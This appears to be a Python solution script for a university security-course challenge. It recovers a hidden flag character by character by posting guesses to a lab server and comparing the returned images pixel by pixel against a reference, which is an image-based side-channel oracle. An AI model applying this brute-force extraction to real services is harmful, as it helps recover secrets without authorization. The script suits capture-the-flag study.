import requests
from PIL import Image
import base64
import os
from bs4 import BeautifulSoup
import time
from PIL import ImageFile

ImageFile.LOAD_TRUNCATED_IMAGES = True

img = Image.open("index.png")
img_color = img.convert("RGB")

def func(image):
    count = 0
    width,height = image.size
    cur_color = image.convert("RGB")
    for i in range(height):
        for j in range(width):
            tmp1 = -1
            original = img_color.getpixel((j,i))
            if original[0] == 255 and original[1] == 255 and original[2] == 255:
                tmp1 = 1
            else:
                tmp1 = 0

            tmp2 = -1
            current = cur_color.getpixel((j,i))
            if current[0] == 255 and current[1] == 255 and current[2] == 255:
                tmp2 = 1
            else:
                tmp2 = 0
            if(tmp1 ^ tmp2 == 0):
                count = count + 1
    return count

string = list("cs628a"  + "a" * 34)
arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', '{', '}']
for i in range (6, 40):
    count = -1
    char = "a"
    for j in arr:
        cur_str = string
        cur_str[i] = j
        file = open("tmp.png", "wb")
        print(''.join(cur_str))
        while True:
            try:
                r = requests.post("https://cseproj91.cse.iitk.ac.in:8020/", {'text': ''.join(cur_str)}, verify=False)
                break
            except:
                continue
        result = ""
        try:
            parsed_html = BeautifulSoup(r.text, 'html.parser')
            element = (parsed_html.find('img')['src'])
            result = (element[element.find("base64,") + 7:])
        except:
            result = "bad!"

        if(result == "empty"):
            print("empty")
        else:
            tmp3 = ""
            try:
                parsed_html = BeautifulSoup(r.text, 'html.parser')
                element = (parsed_html.find('img')['src'])
                tmp3 = (element[element.find("base64,") + 7:])
            except:
                tmp3 = "bad!"
            file.write(base64.b64decode(tmp3))
            file.close()
            element = Image.open("tmp.png")
            anr = func(element)
            print (anr)
            if(anr == count):
                print("problem")
            if (anr > count):
                count = anr
                char = j
        os.remove("tmp.png")
    string[i] = char
    print("".join(string))